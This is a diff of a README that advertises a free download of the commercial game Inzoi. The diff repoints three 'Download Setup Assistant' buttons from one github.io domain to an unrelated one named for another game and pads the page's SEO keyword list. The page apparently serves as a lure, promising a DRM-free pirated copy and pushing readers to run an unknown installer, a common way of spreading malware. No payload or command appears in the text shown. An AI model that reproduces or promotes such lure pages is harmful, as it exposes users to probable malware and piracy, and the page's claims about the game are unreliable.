@@ -1,6 +1,6 @@
-# Inzoi — Free Download
+# Inzoi — Free Download & Full Installation Guide
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.guthub)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://rematch-install-pc-game.github.io/.github/)
 
 ## 🧬 About the Game
 
@@ -25,7 +25,7 @@ With this guide, you'll enjoy the full experience of **Inzoi free download** wit
 
 ---
 
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.guthub)
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://rematch-install-pc-game.github.io/.github/)
 
 ---
 
@@ -46,12 +46,12 @@ With this guide, you'll enjoy the full experience of **Inzoi free download** wit
 - 🌍 AI-powered social dynamics and behavior modeling  
 - 🎮 No DRM, no internet connection, fully local install  
 - 🖥 Optimized for PC with Unreal Engine 5 visuals
-
-[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://inzoi-download-game.github.io/.guthub)
+  
+[![⬇ Download Setup Assistant](https://img.shields.io/badge/⏬%20Download-Setup_Assistant-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://rematch-install-pc-game.github.io/.github/)
 
 ---
 
 ## 🔍 SEO Keywords
 
-inzoi free download, inzoi, inzoi free game, inzoi install, inzoi free PC Game, inzoi install for free
+inzoi free download, inzoi, inzoi free game, inzoi install, inzoi free PC Game, inzoi install for free, inzoi free game
 
